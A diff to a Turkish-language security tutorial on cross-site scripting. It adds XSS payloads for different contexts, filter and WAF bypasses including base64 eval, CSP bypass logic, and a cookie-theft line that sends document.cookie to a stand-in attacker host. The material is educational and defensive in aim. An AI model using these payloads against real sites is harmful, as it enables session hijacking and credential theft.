@@ -62,9 +62,59 @@ flowchart TD
 
 ---
 
+## 3.5. İleri teknikler: bağlam, filtre atlatma, gerçek etki
+
+XSS'i "alert(1) açtırma" seviyesinden gerçek anlayışa taşıyan üç boyut vardır: bağlama uygun payload, filtre atlatma ve gerçek silahlandırma.
+
+### Bağlama göre payload (context matters)
+Aynı girdi, HTML'de nereye düştüğüne göre farklı payload gerektirir — sistemi anlayan saldırgan önce "girdim nereye, nasıl gömülüyor?" diye bakar:
+```html
+<!-- HTML gövdesinde: yeni etiket aç -->
+<script>alert(1)</script>
+
+<!-- Bir öznitelik değeri içinde (value="GİRDİ"): önce tırnaktan çık -->
+"><script>alert(1)</script>
+" onmouseover="alert(1)
+
+<!-- Bir <script> bloğu içinde (var x="GİRDİ"): JS'ten çık -->
+";alert(1);//
+
+<!-- Bir href/src içinde: javascript: şeması -->
+javascript:alert(1)
+```
+
+### Filtre/WAF atlatma
+`<script>` engellenmişse, JavaScript çalıştırmanın **onlarca başka yolu** vardır — bu yüzden kara liste ([enjeksiyon-aileleri.md](enjeksiyon-aileleri.md)) kaybeder:
+```html
+<img src=x onerror=alert(1)>                <!-- olay işleyici (event handler) -->
+<svg onload=alert(1)>                        <!-- script'siz çalışma -->
+<body onpageshow=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">tıkla</a>
+<!-- Filtre "alert" kelimesini engellerse: -->
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">   <!-- Base64'lü payload (kodlama ≠ engel) -->
+<img src=x oNeRrOr=alert(1)>                 <!-- büyük/küçük harf karışımı -->
+```
+Base64 kullanımı ([../../00-baslangic/bilgisayar-temelleri.md](../../00-baslangic/bilgisayar-temelleri.md) kodlama≠şifreleme) tam da SQLi WAF atlatmasındaki ([sqli.md](sqli.md)) mantıktır — filtre bir string arıyorsa, aynı kodu farklı yazmak onu köreltir.
+
+### CSP atlatma (temel mantık)
+İçerik Güvenlik Politikası ([../../01-ag-networking/http-web-iletisimi.md](../../01-ag-networking/http-web-iletisimi.md)) satır-içi (inline) script'i engelleyerek XSS'i azaltır. Ama zayıf yapılandırılmış CSP atlatılabilir: `unsafe-inline` varsa CSP baştan işlevsiz; izin verilen bir CDN'de saldırganın kontrol edebildiği bir JSONP uç noktası veya eski kütüphane (gadget) varsa oradan yürütme sağlanabilir. CSP bir **azaltma** (mitigation) katmanıdır, çıktı kodlamanın yerine geçmez.
+
+### Gerçek silahlandırma (alert'in ötesi)
+`alert(1)` sadece "çalıştı mı?" kanıtıdır. Gerçek saldırıda payload:
+```html
+<!-- Oturum çerezini saldırgana gönder (HttpOnly yoksa) -->
+<script>new Image().src='http://saldirgan/c='+document.cookie</script>
+<!-- Kimlik bilgisi çalan sahte form enjekte et, tuş kaydet (keylogger), -->
+<!-- veya kurban adına istek gönder (CSRF token'ı okuyarak) -->
+```
+> **Kesişim:** Çerez hırsızlığı yalnızca çerezde `HttpOnly` bayrağı **yoksa** çalışır ([../../01-ag-networking/http-web-iletisimi.md](../../01-ag-networking/http-web-iletisimi.md)) — bu yüzden HttpOnly, XSS başarılı olsa bile oturum çalmayı engelleyen kritik katmandır. XSS'in CSRF token'ını okuyup CSRF korumasını da atlatabilmesi ([csrf-ssrf.md](csrf-ssrf.md)), onu neden CSRF'ten "daha güçlü" yaptığının kanıtıdır.
+
+---
+
 ## 4. Nüans: diğer sık hatalar
 
-- **"Kara liste ile `<script>`'i engelledim":** Atlatılabilir — `<img src=x onerror=alert(1)>`, `<svg onload=...>`, olay işleyicileri (event handlers), `javascript:` URI'leri, kodlama hileleri. XSS payload yüzeyi çok geniştir; kara liste kaybeden bir oyundur.
+- **"Kara liste ile `<script>`'i engelledim":** Atlatılabilir (yukarıdaki §3.5) — `<img src=x onerror=alert(1)>`, `<svg onload=...>`, olay işleyicileri (event handlers), `javascript:` URI'leri, kodlama hileleri. XSS payload yüzeyi çok geniştir; kara liste kaybeden bir oyundur.
 - **Bağlam (context) önemlidir:** Aynı girdi HTML gövdesinde, HTML özniteliğinde, JavaScript içinde, URL'de veya CSS'te farklı kaçış gerektirir. "HTML encode ettim" bir JS bağlamında yetmeyebilir.
 - **XSS ↔ CSRF farkı:** XSS = sitenin kullanıcıya **güveninin** istismarı (kod çalıştırma). CSRF = sitenin kullanıcının **tarayıcısına güveninin** istismarı ([csrf-ssrf.md](csrf-ssrf.md)). XSS genelde daha güçlüdür çünkü CSRF korumalarını da (token okuyarak) atlatabilir.
 
